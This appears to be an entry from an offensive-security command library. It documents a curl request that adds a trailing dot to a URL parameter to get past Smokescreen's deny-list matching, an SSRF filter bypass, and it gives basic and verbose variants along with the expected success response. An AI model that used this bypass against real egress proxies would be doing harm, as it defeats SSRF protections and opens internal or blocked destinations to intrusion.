---
id: c-curl-bypass-url
data: 'curl -X GET "http://internal-service-endpoint?url=http://example.com."'
tags:
  - bypass
  - ssrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:08.915Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-url

## Command

```bash
curl -X GET "http://internal-service-endpoint?url=http://example.com."
```

## Description

This command submits a URL with a trailing dot to bypass Smokescreen's deny_list matching.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `url=http://example.com.` | Bypassed URL with trailing dot | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://internal-service-endpoint?url=http://example.com."
```

### Advanced Usage

```bash
curl -X GET -v "http://internal-service-endpoint?url=http://example.com." > bypass.log
```

## Expected Output

HTTP 200 or successful proxy response, indicating bypass success.

## Related

- [[commands/curl-test-denied-url]]
- [[procedures/Bypass-Deny-List-with-Trailing-Dot]]
